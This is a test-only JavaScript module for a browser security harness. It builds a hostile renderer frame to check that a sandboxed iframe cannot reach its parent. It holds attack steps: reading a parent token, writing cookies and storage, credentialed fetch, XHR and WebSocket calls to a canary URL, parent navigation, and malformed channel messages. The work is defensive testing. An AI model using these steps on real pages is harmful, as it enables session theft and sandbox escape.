// Test-only malicious child bytes. The real browser harness replaces the frame
// module in a private asset copy and uses the ordinary production assembler,
// exact resulting script hash, and sandbox. This module must never be installed.
export const ATTACK_MODULE_ATTRIBUTE = 'data-foundation-attack-module';
export const ATTACK_DOM_MODULE_ATTRIBUTE = 'data-foundation-attack-dom-module';
export const ATTACK_PAYLOAD_ATTRIBUTE = 'data-foundation-attack-payload';
export const ATTACK_REPORT_ATTRIBUTE = 'data-foundation-attack-report';
export const ATTACK_REPORT_PROTOCOL = 'foundation-test-attack-report-v1';
export const ATTACK_CHANNEL_PROTOCOL = 'foundation-renderer-v1';
export const ATTACK_SCENARIOS = Object.freeze([
  'authority', 'sibling', 'initial-navigation', 'wrong-nonce', 'extra-ports', 'duplicate-ready', 'duplicate-bound',
  'duplicate-request', 'oversized-request', 'stale-message-generation', 'stale-key-generation',
  'queue-bounds',
  'forbidden-service', 'forbidden-file', 'forbidden-poll', 'forbidden-resize',
  'forbidden-close', 'forbidden-transport', 'own-navigation',
]);
export const AUTHORITY_PROBES = Object.freeze([
  'parent-dom', 'parent-global', 'parent-token', 'parent-storage', 'parent-cookie',
  'child-local-storage', 'child-session-storage', 'child-cookie', 'child-indexed-db',
  'fetch', 'xhr', 'websocket', 'image', 'script', 'stylesheet', 'css-image',
  'css-font', 'worker', 'nested-frame', 'object', 'form', 'popup', 'parent-navigation',
  'download', 'clipboard', 'file-picker',
]);

const quote = value => JSON.stringify(value).replaceAll('<', '\\u003c');

// The default operation is usable with a synthetic current button declaration.
// Real-application harnesses supply one currently eligible ordinary UI intent.
export function maliciousRendererSource({canaryURL, marker, scenario = 'authority',
  witnessOperation = {type: 'activate', key: {id: 'attack.witness', generation: '1'}},
  oversizeBytes = 1024 * 1024 + 4096} = {}) {
  if (typeof canaryURL !== 'string' || !/^https?:\/\//.test(canaryURL)) throw Error('An absolute HTTP canary URL is required');
  if (typeof marker !== 'string' || !marker || marker.length > 256) throw Error('A bounded attack marker is required');
  if (!ATTACK_SCENARIOS.includes(scenario)) throw Error('Unknown malicious renderer scenario');
  if (!witnessOperation || typeof witnessOperation !== 'object' || Array.isArray(witnessOperation)) throw Error('A witness operation is required');
  if (!Number.isSafeInteger(oversizeBytes) || oversizeBytes < 1024 * 1024 + 1 || oversizeBytes > 3 * 1024 * 1024) throw Error('Invalid oversized probe bound');
  const options = {canaryURL, marker, scenario, witnessOperation, oversizeBytes,
    moduleAttribute: ATTACK_MODULE_ATTRIBUTE, domModuleAttribute: ATTACK_DOM_MODULE_ATTRIBUTE,
    payloadAttribute: ATTACK_PAYLOAD_ATTRIBUTE,
    reportAttribute: ATTACK_REPORT_ATTRIBUTE, reportProtocol: ATTACK_REPORT_PROTOCOL,
    protocol: ATTACK_CHANNEL_PROTOCOL};
  return `// Test-only hostile renderer frame, assembled by the production graph.\n` +
    `import {Renderer} from './renderer_dom.mjs';\n` +
    `import {createBrowserPresenter} from './browser_presenter.mjs';\n` +
    `import {createRendererRequests} from './renderer_channel.mjs';\n` +
    `import {CHANNEL_PROTOCOL} from './browser_limits.mjs';\n` +
    `export function startRendererFrame() {\n(${maliciousRuntime.toString()})(${quote(options)});\n}\n` +
    `startRendererFrame();\n`;
}

// A sibling receives a deliberately disclosed nonce in this stronger negative
// control. Even the right nonce cannot compensate for the wrong WindowProxy.
export function siblingAttackSource({generation, marker, extraPorts = false} = {}) {
  if (typeof generation !== 'string' || !generation || generation.length > 256) throw Error('A bounded generation is required');
  if (typeof marker !== 'string' || !marker || marker.length > 256) throw Error('A bounded attack marker is required');
  return `(${siblingRuntime.toString()})(${quote({generation, marker, extraPorts,
    protocol: ATTACK_CHANNEL_PROTOCOL, moduleAttribute: ATTACK_MODULE_ATTRIBUTE,
    payloadAttribute: ATTACK_PAYLOAD_ATTRIBUTE, reportAttribute: ATTACK_REPORT_ATTRIBUTE,
    reportProtocol: ATTACK_REPORT_PROTOCOL})});\n`;
}

function siblingRuntime(options) {
  const generation = options.generation === 'from-meta' ? document.querySelector('meta[name="foundation-channel"]').content : options.generation;
  const report = {marker: options.marker, scenario: 'sibling', moduleRan: true,
    payloadRan: true, attempts: [], connections: 0, complete: false};
  document.documentElement.setAttribute(options.moduleAttribute, options.marker);
  document.documentElement.setAttribute(options.payloadAttribute, options.marker);
  const publish = () => {
    document.documentElement.setAttribute(options.reportAttribute, JSON.stringify(report));
    parent.postMessage({protocol: options.reportProtocol, report}, '*');
  };
  const channel = new MessageChannel();
  channel.port1.onmessage = event => {
    if (event.data?.protocol === options.protocol && event.data?.type === 'connect') {
      report.connections += 1;
      for (const port of event.ports) port.close();
      publish();
    }
  };
  channel.port1.start();
  const packet = {protocol: options.protocol, type: 'ready', generation};
  report.attempts.push({name: 'sibling-ready', attempted: true, correctNonce: true});
  if (options.extraPorts) {
    const additional = new MessageChannel();
    parent.postMessage(packet, '*', [channel.port2, additional.port2]);
    additional.port1.close();
  } else parent.postMessage(packet, '*', [channel.port2]);
  report.complete = true;
  publish();
}

function maliciousRuntime(options) {
  const nonce = document.querySelector('meta[name="foundation-channel"]')?.content;
  const report = {marker: options.marker, scenario: options.scenario, moduleRan: true,
    rendererDOMModuleRan: document.documentElement.getAttribute(options.domModuleAttribute) === options.marker,
    payloadRan: false, nonceFound: typeof nonce === 'string' && nonce.length > 0,
    attempts: [], policyViolations: [], states: [], results: [], connections: 0,
    witnessAccepted: false, complete: false};
  let port = null, nextId = 1, started = false;
  const waiters = new Map();
  let reportSequence = 0;
  const reportWaiters = new Map();
  document.documentElement.setAttribute(options.moduleAttribute, options.marker);
  const publish = () => {
    report.receipt = String(++reportSequence);
    document.documentElement.setAttribute(options.reportAttribute, JSON.stringify(report));
    parent.postMessage({protocol: options.reportProtocol, report}, '*');
  };
  addEventListener('message', event => {
    const message = event.data;
    if (event.source !== parent || event.ports.length || message?.protocol !== 'foundation-test-attack-report-ack-v1' ||
        message.marker !== options.marker || Object.keys(message).length !== 3) return;
    const receive = reportWaiters.get(message.receipt);
    if (receive) {reportWaiters.delete(message.receipt);receive();}
  });
  const confirmReport = () => new Promise((resolve, reject) => {
    const receipt = String(reportSequence + 1);
    const timer = setTimeout(() => {reportWaiters.delete(receipt);reject(Error('Test report delivery acknowledgment timed out'));}, 2000);
    reportWaiters.set(receipt, () => {clearTimeout(timer);resolve();});
    publish();
  });
  const packet = (type, fields = {}) => ({protocol: options.protocol, type, generation: nonce, ...fields});
  const record = (name, detail = {}) => {
    const attempt = {name, attempted: true, ...detail};
    report.attempts.push(attempt); publish(); return attempt;
  };
  const outcome = (attempt, value) => { attempt.outcome = value; publish(); };
  const probeReady = async (name, detail = {}) => {record(name, detail);await confirmReport();};
  const target = name => {
    const url = new URL(options.canaryURL);
    url.searchParams.set('marker', options.marker); url.searchParams.set('kind', name);
    return url.href;
  };
  const attemptSync = (name, action) => {
    const attempt = record(name);
    try { const value = action(); outcome(attempt, value === undefined ? 'returned' : String(value).slice(0, 128)); }
    catch (error) { outcome(attempt, `threw:${error.name}`); }
  };
  const attemptAsync = async (name, action) => {
    const attempt = record(name);
    try { await action(); outcome(attempt, 'resolved'); }
    catch (error) { outcome(attempt, `rejected:${error.name}`); }
  };
  const resource = (name, element, property = 'src') => new Promise(resolve => {
    const attempt = record(name);
    let finished = false;
    const finish = result => {
      if (finished) return; finished = true; clearTimeout(timer);
      element.remove(); outcome(attempt, result); resolve();
    };
    const timer = setTimeout(() => finish('no-load-within-bound'), 350);
    element.addEventListener('load', () => finish('load'), {once: true});
    element.addEventListener('error', () => finish('error'), {once: true});
    element[property] = target(name); document.body.append(element);
  });
  addEventListener('securitypolicyviolation', event => {
    report.policyViolations.push({directive: event.effectiveDirective,
      blocked: event.blockedURI, disposition: event.disposition});
    publish();
  });
  const markPayload = () => {
    report.payloadRan = true;
    document.documentElement.setAttribute(options.payloadAttribute, options.marker);
    publish();
  };
  const sendRequest = (operation, {id = String(nextId++), generation = nonce, extra = {}} = {}) => {
    const request = {...packet('request', {id, operation}), generation, ...extra};
    port.postMessage(request); return id;
  };
  const witness = () => new Promise((resolve, reject) => {
    const id = String(nextId++);
    const timer = setTimeout(() => {waiters.delete(id); reject(Error('Witness result timed out'));}, 2000);
    waiters.set(id, result => {clearTimeout(timer); resolve(result);});
    record('benign-witness', {id});
    port.postMessage(packet('request', {id, operation: options.witnessOperation}));
  });
  const authority = async () => {
    attemptSync('parent-dom', () => {parent.document.getElementById('foundation-security-canary').textContent = options.marker;});
    attemptSync('parent-global', () => {parent.foundationSecurityCanary = options.marker;});
    attemptSync('parent-token', () => parent.foundationTransportToken);
    attemptSync('parent-storage', () => {parent.localStorage.setItem('foundation-security-canary', options.marker);});
    attemptSync('parent-cookie', () => {parent.document.cookie = `foundation-security-canary=${encodeURIComponent(options.marker)}`;});
    attemptSync('child-local-storage', () => {localStorage.setItem('foundation-security-canary', options.marker); return localStorage.getItem('foundation-security-canary');});
    attemptSync('child-session-storage', () => {sessionStorage.setItem('foundation-security-canary', options.marker); return sessionStorage.getItem('foundation-security-canary');});
    attemptSync('child-cookie', () => {document.cookie = `foundation-security-canary=${encodeURIComponent(options.marker)}`; return document.cookie;});
    attemptSync('child-indexed-db', () => {const request = indexedDB.open(`foundation-attack-${options.marker}`); request.onsuccess = () => {request.result.close(); outcome(report.attempts.find(a => a.name === 'child-indexed-db'), 'opened');};});
    attemptSync('form', () => {const form = document.createElement('form'); form.action = target('form'); form.method = 'post'; document.body.append(form); form.submit(); form.remove();});
    attemptSync('popup', () => {const popup = open(target('popup'), '_blank'); return popup === null ? 'null' : 'opened';});
    attemptSync('parent-navigation', () => {parent.location.href = target('parent-navigation');});
    attemptSync('download', () => {const link = document.createElement('a'); link.href = 'data:text/plain,hostile-renderer'; link.download = `hostile-${options.marker}.txt`; document.body.append(link); link.click(); link.remove();});
    attemptSync('worker', () => {const worker = new Worker(target('worker')); worker.terminate();});
    const style = document.createElement('style');
    style.textContent = `#foundation-hostile-css {background-image:url(${JSON.stringify(target('css-image'))})} @font-face {font-family:foundation-hostile;src:url(${JSON.stringify(target('css-font'))})} #foundation-hostile-css {font-family:foundation-hostile}`;
    const css = document.createElement('div'); css.id = 'foundation-hostile-css'; css.textContent = 'network font probe';
    record('css-image'); record('css-font'); document.head.append(style); document.body.append(css);
    const controller = new AbortController();
    const abort = setTimeout(() => controller.abort(), 350);
    await Promise.all([
      attemptAsync('fetch', () => fetch(target('fetch'), {mode: 'no-cors', credentials: 'include', signal: controller.signal})),
      attemptAsync('xhr', () => new Promise((resolve, reject) => {
        const xhr = new XMLHttpRequest(); xhr.timeout = 350;
        xhr.onload = resolve; xhr.onerror = () => reject(Error('XHR rejected'));
        xhr.ontimeout = () => reject(Error('XHR timed out'));
        xhr.open('POST', target('xhr')); xhr.withCredentials = true; xhr.send(options.marker);
      })),
      attemptAsync('websocket', () => new Promise((resolve, reject) => {
        const url = new URL(target('websocket')); url.protocol = url.protocol === 'https:' ? 'wss:' : 'ws:';
        const socket = new WebSocket(url.href);
        const timer = setTimeout(() => {socket.close(); reject(Error('WebSocket timed out'));}, 350);
        socket.onopen = () => {clearTimeout(timer); socket.close(); resolve();};
        socket.onerror = () => {clearTimeout(timer); socket.close(); reject(Error('WebSocket rejected'));};
      })),
      resource('image', document.createElement('img')),
      resource('script', document.createElement('script')),
      resource('stylesheet', Object.assign(document.createElement('link'), {rel: 'stylesheet'}), 'href'),
      resource('nested-frame', document.createElement('iframe')),
      resource('object', document.createElement('object'), 'data'),
      attemptAsync('clipboard', () => navigator.clipboard ? navigator.clipboard.writeText(options.marker) : Promise.reject(Error('Clipboard unavailable'))),
      attemptAsync('file-picker', () => globalThis.showOpenFilePicker ? showOpenFilePicker() : Promise.reject(Error('File picker unavailable'))),
    ]);
    clearTimeout(abort); controller.abort(); style.remove(); css.remove();
  };
  const run = async () => {
    if (started) return; started = true; markPayload();
    try {
      const result = await witness();
      report.witnessAccepted = result.ok === true; publish();
      if (!report.witnessAccepted) throw Error(`Witness rejected: ${result.error || 'unknown'}`);
      await confirmReport();
      if (options.scenario === 'authority' || options.scenario === 'sibling') await authority();
      else if (options.scenario === 'duplicate-bound') {
        await probeReady('duplicate-bound'); port.postMessage(packet('bound'));
      } else if (options.scenario === 'duplicate-ready') {
        await probeReady('duplicate-ready'); const additional = new MessageChannel();
        parent.postMessage(packet('ready'), '*', [additional.port2]); additional.port1.close();
      } else if (options.scenario === 'duplicate-request') {
        await probeReady('duplicate-request', {id: '1'}); sendRequest(options.witnessOperation, {id: '1'});
      } else if (options.scenario === 'oversized-request') {
        await probeReady('oversized-request', {bytes: options.oversizeBytes});
        sendRequest(options.witnessOperation, {extra: {padding: 'x'.repeat(options.oversizeBytes)}});
      } else if (options.scenario === 'stale-message-generation') {
        await probeReady('stale-message-generation'); sendRequest(options.witnessOperation, {generation: `stale-${nonce}`});
      } else if (options.scenario === 'stale-key-generation') {
        await probeReady('stale-key-generation'); sendRequest({...options.witnessOperation,
          key: {...options.witnessOperation.key, generation: '999'}});
      } else if (options.scenario === 'queue-bounds') {
        await probeReady('queue-bounds', {requests: 129});
        for (let index = 0; index < 129; index += 1) sendRequest(options.witnessOperation);
      } else if (options.scenario.startsWith('forbidden-')) {
        const operations = {
          'forbidden-service': {type: 'service', id: 'attack-service', accepted: true, value: options.marker},
          'forbidden-file': {type: 'filePath', id: 'attack-service', path: target('native-path')},
          'forbidden-poll': {type: 'poll'}, 'forbidden-resize': {type: 'resize', width: 1, height: 1},
          'forbidden-close': {type: 'close'},
          'forbidden-transport': {epoch: 'attack', seq: '1', operation: options.witnessOperation},
        };
        await probeReady(options.scenario); sendRequest(operations[options.scenario]);
      } else if (options.scenario === 'own-navigation') {
        record('own-navigation'); report.complete = true; publish();
        await confirmReport();
        setTimeout(() => {location.href = target('own-navigation');}, 100); return;
      }
      await new Promise(resolve => setTimeout(resolve, 100));
      report.complete = true; publish();
    } catch (error) {report.error = `${error.name}: ${error.message}`; report.complete = true; publish();}
  };
  const channel = new MessageChannel();
  port = channel.port1;
  port.onmessage = event => {
      const message = event.data;
      if (message?.protocol !== options.protocol || message?.generation !== nonce) return;
      if (message.type === 'connect') {
        report.connections += 1;
        record('connect-received', {generationMatches: message.generation === nonce, ports: event.ports.length});
        if (event.ports.length || report.connections !== 1 || Object.keys(message).length !== 3) return;
        port.postMessage(packet('bound')); publish();
      } else if (message.type === 'state') {
        report.states.push({revision: message.revision, barrier: message.barrier, cancelPointers: message.cancelPointers});
        port.postMessage(packet('stateAck', {revision: message.revision})); publish();
        void run();
      } else if (message.type === 'result') {
        report.results.push({id: message.id, ok: message.ok, error: message.error}); publish();
        const complete = waiters.get(message.id);
        if (complete) {waiters.delete(message.id); complete(message);}
      }
  };
  port.onmessageerror = () => {report.portMessageError = true; publish();};
  port.start();
  if (!report.nonceFound) {report.error = 'Production channel meta missing'; report.complete = true; publish(); return;}
  if (options.scenario === 'initial-navigation') {
    markPayload(); record('initial-navigation'); report.complete = true; publish();
    parent.postMessage(packet('ready'), '*', [channel.port2]);
    location.replace(target('initial-navigation'));
  } else if (options.scenario === 'wrong-nonce') {
    markPayload(); record('wrong-nonce'); parent.postMessage(packet('ready', {generation: `wrong-${nonce}`}), '*', [channel.port2]);
    report.complete = true; publish();
  } else if (options.scenario === 'extra-ports') {
    markPayload(); record('extra-ports'); const additional = new MessageChannel();
    parent.postMessage(packet('ready'), '*', [channel.port2, additional.port2]); additional.port1.close();
    report.complete = true; publish();
  } else if (options.scenario === 'sibling') {
    setTimeout(()=>{parent.postMessage(packet('ready'), '*', [channel.port2]);publish();},250);
  } else {parent.postMessage(packet('ready'), '*', [channel.port2]); publish();}
}
